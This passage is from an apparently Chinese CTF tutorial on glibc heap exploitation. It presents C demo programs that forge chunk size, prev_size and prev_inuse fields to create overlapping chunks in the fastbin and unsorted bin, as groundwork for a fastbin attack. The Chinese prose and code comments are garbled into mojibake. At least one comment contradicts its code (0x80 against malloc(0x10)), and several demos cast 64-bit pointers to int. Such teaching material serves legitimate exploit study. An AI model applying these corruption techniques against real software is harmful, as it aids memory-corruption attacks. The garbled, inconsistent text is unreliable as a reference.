çš„æ—¶å€™ï¼Œ<code>chunk2</code> ä¹Ÿä¼šè¢« <code>free</code> æ‰</p><p>è€Œå½“æˆ‘ä»¬å†æ¬¡è¯·æ±‚è¿™ä¸¤ä¸ªå †å—å¤§å°ä¹‹å’Œçš„å †å—æ—¶ï¼Œå°±ä¼šè·å¾— <code>chunk1 + chunk2</code> çš„ç©ºé—´ï¼Œä¹Ÿå°±å¯ä»¥æ§åˆ¶ <code>chunk2</code> çš„å†…å®¹</p></blockquote><p>ç¤ºä¾‹ï¼šï¼ˆ64 ä½ç¨‹åºï¼‰</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token operator">*</span>ptr1<span class="token punctuation">;</span>

    ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// åˆ†é…ç¬¬ä¸€ä¸ª 0x10 çš„ chunk</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// åˆ†é…ç¬¬äºŒä¸ª 0x10 çš„chunk</span>

    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span> ptr <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x41</span><span class="token punctuation">;</span>   <span class="token comment">// ä¿®æ”¹ç¬¬ä¸€ä¸ªå—çš„ size åŸŸ</span>

    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// å®ç° extendï¼Œæ§åˆ¶äº†ç¬¬äºŒä¸ªå—çš„å†…å®¹</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“æˆ‘ä»¬ <code>malloc</code> ä¸¤ä¸ªå †å—åï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A85.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨5.png"></p><p>ç„¶åä¿®æ”¹ <code>chunk1</code> çš„ <code>size</code> åŸŸä¸º <code>0x41</code>ï¼ˆåŒ…æ‹¬äº† <code>chunk2</code> çš„å¤§å°ï¼‰ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A86.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨6.png"></p><p>å¯ä»¥çœ‹åˆ° <code>free</code> æ‰ <code>chunk1</code> åï¼Œ<code>chunk2</code> ä¹Ÿè¢« <code>free</code> æ‰äº†ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A87.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨7.png"></p><p>æ­¤æ—¶å¦‚æœæˆ‘ä»¬å†é€šè¿‡ <code>malloc(0x30)</code> åˆ†é…å †å—ï¼Œå°±ä¼šå¾—åˆ° <code>chunk1 + chunk2</code> çš„å—ï¼Œæ­¤æ—¶å°±å¯ä»¥ç›´æ¥æ§åˆ¶ <code>chunk2</code> ä¸­çš„å†…å®¹</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A88.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨8.png"></p><p>è¿™ç§çŠ¶æ€å°±ç§°ä¸º <code>Overlap chunk</code></p><hr><h2 id="å¯¹-inuse-çš„-small-bin-è¿›è¡Œ-extend"><a href="#å¯¹-inuse-çš„-small-bin-è¿›è¡Œ-extend" class="headerlink" title="å¯¹ inuse çš„ small bin è¿›è¡Œ extend"></a>å¯¹ inuse çš„ small bin è¿›è¡Œ extend</h2><blockquote><p>å½“ <code>free</code> æ‰çš„ <code>chunk size &gt;= 144</code>ï¼ˆ0x90ï¼‰å­—èŠ‚æ—¶ï¼Œä¼šè¢«ç½®äº <code>unsorted bin</code> ä¸­ï¼Œè¿™æ¬¡ä»¥ <code>malloc(0x80)</code> æ¥ä¸¾ä¾‹</p><p>ä¸å‰é¢çš„ <code>fast bin</code> ä¸åŒçš„æ˜¯ï¼Œè¿™ç§æƒ…å†µä¸‹è¿˜éœ€è¦å† <code>malloc</code> ä¸€å—ç©ºé—´ç”¨æ¥é˜²æ­¢ <code>unsorted bin</code> ä¸ <code>top chunk</code> åˆå¹¶</p></blockquote><p>ç¤ºä¾‹ï¼šï¼ˆ64 ä½ç¨‹åºï¼‰</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token operator">*</span>ptr1<span class="token punctuation">;</span>

    ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// åˆ†é…ç¬¬ä¸€ä¸ª 0x80 çš„ chunk1</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// åˆ†é…ç¬¬äºŒä¸ª 0x10 çš„ chunk2</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// é˜²æ­¢ä¸ top chunk åˆå¹¶</span>

    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> ptr <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xb1</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“æˆ‘ä»¬ <code>malloc</code> ä¸‰ä¸ªå †å—åï¼ˆ<code>chunk3</code> ç”¨æ¥é˜²æ­¢ <code>chunk1</code> è¢«ç¯¡æ”¹å¹¶ <code>free</code> åä¸ <code>top chunk</code> åˆå¹¶ï¼‰ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A89.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨9.png"></p><p>ç„¶åä¿®æ”¹ <code>chunk1</code> çš„ <code>size</code> åŸŸä¸º <code>0xb1</code>ï¼ˆåŒ…æ‹¬äº† <code>chunk2</code> çš„å¤§å°ï¼‰ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A810.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨10.png"></p><p>å¯ä»¥çœ‹åˆ° <code>free</code> æ‰ <code>chunk1</code> åï¼Œ<code>chunk2</code> ä¹Ÿè¢« <code>free</code> æ‰äº†ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A811.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨11.png"></p><p>æ­¤æ—¶ <code>chunk1</code> å’Œ <code>chunk2</code> è¢«ä¸€èµ·ç½®å…¥ <code>unsorted bin</code></p><p>æ­¤æ—¶å¦‚æœæˆ‘ä»¬å†é€šè¿‡ <code>malloc(0xa0)</code> åˆ†é…å †å—ï¼Œå°±ä¼šå¾—åˆ° <code>chunk1 + chunk2</code> çš„å—ï¼Œæ­¤æ—¶å°±å¯ä»¥ç›´æ¥æ§åˆ¶ <code>chunk2</code> ä¸­çš„å†…å®¹ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A812.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨12.png"></p><hr><h2 id="å¯¹-free-çš„-small-bin-è¿›è¡Œ-extend"><a href="#å¯¹-free-çš„-small-bin-è¿›è¡Œ-extend" class="headerlink" title="å¯¹ free çš„ small bin è¿›è¡Œ extend"></a>å¯¹ free çš„ small bin è¿›è¡Œ extend</h2><blockquote><p>åœ¨ï¼Œå…ˆé‡Šæ”¾ <code>chunk1</code>ï¼Œç„¶åå†ä¿®æ”¹å¤„äº <code>unsorted bin</code> ä¸­çš„ <code>chunk1</code> çš„ <code>size</code> åŸŸï¼Œä¼šä½¿å¾— chunk2 ä¹Ÿè¢«ç½®äº <code>unsorted bin</code> ä¸­</p><p>å½“æˆ‘ä»¬å†æ¬¡è¯·æ±‚è¿™ä¸¤ä¸ªå †å—å¤§å°ä¹‹å’Œçš„å †å—æ—¶ï¼Œå°±ä¼šè·å¾— <code>chunk1 + chunk2</code> çš„ç©ºé—´ï¼Œä¹Ÿå°±å¯ä»¥æ§åˆ¶ <code>chunk2</code> çš„å†…å®¹</p></blockquote><p>ç¤ºä¾‹ï¼šï¼ˆ64 ä½ç¨‹åºï¼‰</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token operator">*</span>ptr1<span class="token punctuation">;</span>

    ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// åˆ†é…ç¬¬ä¸€ä¸ª 0x80 çš„ chunk1</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// åˆ†é…ç¬¬äºŒä¸ª 0x10 çš„ chunk2</span>

    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// é¦–å…ˆè¿›è¡Œé‡Šæ”¾ï¼Œä½¿å¾— chunk1 è¿›å…¥ unsorted bin</span>

    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> ptr <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xb1</span><span class="token punctuation">;</span>
    ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“ <code>malloc</code> åˆ†é…ä¸¤ä¸ªå †å—åï¼Œç›´æ¥ <code>free</code> æ‰ <code>chunk1</code> ä½¿å…¶è¢«ç½®äº <code>unsorted bin</code>ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A813.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨13.png"></p><p>æ­¤æ—¶ä¿®æ”¹ <code>unsorted bin</code> çš„ <code>size</code> åŸŸä¸º <code>0xb1</code>ï¼ˆåŒ…æ‹¬äº† <code>chunk2</code> çš„å¤§å°ï¼‰ï¼Œå‘ç° <code>chunk2</code> ä¹Ÿè¢«ç½®äº <code>unsorted bin</code> ä¸­ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A814.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨14.png"></p><p>ç„¶åå† <code>malloc(0xa0)</code> çš„å¤§å°å°±å¯ä»¥å¾—åˆ°&nbsp;<code>chunk1 + chunk2</code> çš„å †å—ï¼Œä»è€Œæ§åˆ¶äº† <code>chunk2</code> çš„å†…å®¹ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A815.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨15.png"></p><hr><h2 id="é€šè¿‡-extend-åå‘-Overlap"><a href="#é€šè¿‡-extend-åå‘-Overlap" class="headerlink" title="é€šè¿‡ extend åå‘ Overlap"></a>é€šè¿‡ extend åå‘ Overlap</h2><p>ç¤ºä¾‹ï¼šï¼ˆ64 ä½ç¨‹åºï¼‰</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token operator">*</span>ptr1<span class="token punctuation">;</span>

    ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// åˆ†é…ç¬¬ 1 ä¸ª 0x80 çš„ chunk1</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// åˆ†é…ç¬¬ 2 ä¸ª 0x10 çš„ chunk2</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// åˆ†é…ç¬¬ 3 ä¸ª 0x10 çš„ chunk3</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// åˆ†é…ç¬¬ 4 ä¸ª 0x10 çš„ chunk4    </span>
    
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> ptr <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x61</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“ <code>malloc</code> åˆ†é…å››ä¸ªå †å—åï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A816.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨16.png"></p><p>ä¿®æ”¹ <code>chunk1</code> çš„ <code>size</code> åŸŸä¸º <code>0x61</code>ï¼ˆåŒ…æ‹¬äº† <code>chunk2</code>ã€<code>chunk3</code> çš„å¤§å°ï¼‰ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A817.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨17.png"></p><p>æ­¤æ—¶ <code>free</code> æ‰ <code>chunk1</code>ï¼Œåˆ™ <code>chunk2</code>ã€<code>chunk3</code> ä¹Ÿä¸€å¹¶è¢« <code>free</code> è¿›å…¥ <code>fast bin</code>ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A818.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨18.png"></p><p>åœ¨ <code>malloc(0x50)</code> å¯¹ <code>extend</code> åŒºåŸŸé‡æ–°å ä½åï¼Œå…¶ä¸­ <code>0x10</code> çš„ <code>fastbin</code> å—ä¾ç„¶å¯ä»¥æ­£å¸¸çš„åˆ†é…å’Œé‡Šæ”¾ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A819.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨19.png"></p><p>æ­¤æ—¶å·²ç»æ„æˆ <code>Overlap</code>ï¼Œé€šè¿‡å¯¹ <code>Overlap</code> çš„è¿›è¡Œæ“ä½œå¯ä»¥å®ç° <code>fastbin attack</code></p><hr><h2 id="é€šè¿‡-extend-å‰å‘-Overlap"><a href="#é€šè¿‡-extend-å‰å‘-Overlap" class="headerlink" title="é€šè¿‡ extend å‰å‘ Overlap"></a>é€šè¿‡ extend å‰å‘ Overlap</h2><p>ç¤ºä¾‹ï¼šï¼ˆ64 ä½ç¨‹åºï¼‰</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>ptr1<span class="token punctuation">,</span> <span class="token operator">*</span>ptr2<span class="token punctuation">,</span> <span class="token operator">*</span>ptr3<span class="token punctuation">,</span> <span class="token operator">*</span>ptr4<span class="token punctuation">;</span>
    ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// smallbin1</span>
    ptr2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// fastbin1</span>
    ptr3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// fastbin2</span>
    ptr4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// smallbin2</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// é˜²æ­¢ä¸ top åˆå¹¶</span>
    <span class="token function">free</span><span class="token punctuation">(</span>ptr1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span> ptr4 <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x90</span><span class="token punctuation">;</span>   <span class="token comment">// ä¿®æ”¹ pre_inuse åŸŸ</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span> ptr4 <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xd0</span><span class="token punctuation">;</span>   <span class="token comment">// ä¿®æ”¹ pre_size åŸŸ</span>
    <span class="token function">free</span><span class="token punctuation">(</span>ptr4<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// unlink è¿›è¡Œå‰å‘ extend</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x150</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// å ä½å—</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“ <code>malloc</code> åˆ†é…äº”ä¸ªå †å—åï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A820.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨20.png"></p><p>æ­¤æ—¶ <code>free</code> æ‰ <code>chunk1</code> ä½¿å…¶ç½®å…¥ <code>unsorted bin</code>ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A821.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨21.png"></p><p>ä¿®æ”¹ <code>chunk4</code> çš„ <code>size</code> åŸŸä¸º <code>0x90</code>ï¼ˆå…¶ä¸­ <code>pre_inuse</code> ä½ä¸º 0ï¼Œä»£è¡¨å‰ä¸€ä¸ª <code>chunk</code> ç©ºé—²ï¼‰</p><p>ä¿®æ”¹ <code>pre_size</code> åŸŸä¸º <code>0xd0</code>ï¼ˆåŒ…æ‹¬äº† <code>chunk2</code> å’Œ <code>chunk3</code> çš„å¤§å°ï¼‰ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A822.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨22.png"></p><p>æ­¤æ—¶ <code>free</code> æ‰ <code>chunk4</code>ï¼Œä¼šå¯¼è‡´ <code>chunk2</code> å’Œ <code>chunk3</code> ä¹Ÿä¸€å¹¶è¢« <code>free</code>ï¼ŒåŒæ—¶ä¸ <code>free</code> æ‰ <code>chunk1</code> åå½¢æˆçš„ <code>unsorted bin</code> åˆå¹¶ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A823.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨23.png"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" 